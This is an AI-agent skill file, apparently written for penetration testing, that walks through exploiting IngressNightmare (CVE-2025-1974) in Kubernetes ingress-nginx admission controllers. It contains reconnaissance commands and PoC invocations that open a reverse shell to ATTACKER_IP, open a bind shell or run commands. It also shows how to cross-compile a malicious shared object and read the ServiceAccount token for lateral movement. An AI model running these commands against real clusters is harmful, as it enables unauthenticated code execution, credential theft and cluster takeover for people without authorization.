---
name: k8s-ingress-nightmare
description: "IngressNightmare (CVE-2025-1974) — unauthenticated RCE against the Kubernetes Ingress-NGINX Admission Controller. Use when the target K8s cluster runs ingress-nginx, an admission webhook is found on port 443/8443, or the admission controller is reachable over the pod network. Covers the vulnerability mechanics, exploitation precondition checks, PoC usage, and follow-on lateral movement."
zh-signals: "IngressNightmare（CVE-2025-1974）Kubernetes Ingress-NGINX Admission Controller 未授权 RCE 的判定、利用与横向移动。信号:IngressNightmare,CVE-2025-1974,ingress-nginx,admission webhook,K8s RCE"
when-to-use: >-
  Use when a target Kubernetes cluster runs ingress-nginx, exposes an admission
  webhook on 443/8443, or the admission controller is reachable from the pod
  network.
metadata:
  tags: "k8s,kubernetes,ingress-nginx,cve-2025-1974,ingressnightmare,rce,admission,webhook,cloud-native"
  category: "cloud"
---

# IngressNightmare — CVE-2025-1974

Ingress-NGINX Admission Controller unauthenticated RCE exploit chain (CVSSv3 9.8), allowing remote code execution from the pod network without any K8s credentials.

## ⛔ Further Reading (Must Read)

- Vulnerability mechanics and exploitation details → [references/exploit-details.md](references/exploit-details.md)

---

## Vulnerability Overview

IngressNightmare is a set of **exploit chains** (CVE-2025-24514 / CVE-2025-1097 / CVE-2025-1098 / CVE-2025-1974) that achieve RCE in two steps:

1. Send a large request to NGINX so that it is cached as a temporary file (at a predictable path under `/tmp/`)
2. Send a malicious `AdmissionReview` to the Admission Webhook, injecting an `ssl_engine` directive that loads a malicious `.so`
3. Code execution is triggered when the webhook runs `nginx -t` to validate the configuration

## Phase 1: Confirm the Preconditions

### 1.1 Confirm the target uses ingress-nginx
```bash
# From outside the cluster
nmap -sV -p 443,8443,80 TARGET_IP
curl -sk https://TARGET_IP/ -I  # check whether the Server header contains nginx

# From inside a pod
kubectl get pods -n ingress-nginx 2>/dev/null
kubectl get svc -n ingress-nginx 2>/dev/null
env | grep -i ingress
```

### 1.2 Locate the Admission Webhook
```bash
# The admission webhook listens on port 8443 by default
# Probe it from inside the pod network
INGRESS_SVC=$(kubectl get svc -n ingress-nginx -o jsonpath='{.items[0].spec.clusterIP}' 2>/dev/null)
curl -sk https://${INGRESS_SVC}:8443/networking/v1/ingresses

# You can also probe pod IPs directly
kubectl get pods -n ingress-nginx -o wide 2>/dev/null
```

### 1.3 Locate the NGINX Uploader (the request-caching endpoint)
```bash
# NGINX listens on 80/443 and you need to be able to send large requests to it
# the uploader is the HTTP entry point of ingress-nginx
UPLOADER="http://${INGRESS_SVC}:80"
# or use the pod IP directly
UPLOADER="http://POD_IP:80"
```

## Phase 2: Exploitation

### 2.1 Use the ingressNightmare PoC

```bash
# Reverse shell (most common)
ingressnightmare -m r -r ATTACKER_IP -p 4444 -i https://INGRESS:8443 -u http://UPLOADER:80

# Bind shell
ingressnightmare -m b -b 9999 -i https://INGRESS:8443 -u http://UPLOADER:80

# Blind command execution
ingressnightmare -m c -c 'id > /tmp/pwn' -i https://INGRESS:8443 -u http://UPLOADER:80
```

### 2.2 Choosing the Injection Variant

| Injection method | Parameter | CVE |
|----------|------|-----|
| auth-url (default) | `--is-auth-url` | CVE-2025-24514 |
| auth-tls-match-cn | `--is-match-cn --auth-secret-name NAME` | CVE-2025-1097 |
| mirror UID | `--is-mirror-uid` | CVE-2025-1098 |

### 2.3 Handling Target Architecture Mismatch

```bash
# If you see "Exec format error", the target is probably arm64
ingressnightmare show-c > exp.c
# Cross-compile for the target architecture
aarch64-linux-gnu-gcc -fPIC -nostdlib -ffreestanding -fno-builtin -o danger.so exp.c -shared
ingressnightmare -m c -c 'id' --so ./danger.so -i https://INGRESS:8443 -u http://UPLOADER:80
```

## Phase 3: Follow-On Exploitation

The RCE lands inside the ingress-nginx pod, which usually holds a highly privileged ServiceAccount:

```bash
# Get the SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check RBAC permissions (ingress-nginx usually has cluster-wide permissions)
kubectl auth can-i --list

# Lateral movement → refer to the k8s-container-escape skill
```

## Tool Quick Reference

| Tool | Purpose | Installation / Path |
|------|------|-------------|
| ingressnightmare | All-in-one PoC for CVE-2025-1974 (Go build, multi-platform) | Install into PATH with `f8x -cloud`; the arsenal payload is at `/pentest/arsenal/ingressnightmare/` |
| kubectl | K8s cluster management | `f8x -cloud` |
| nmap | Port probing | `apt install nmap` |
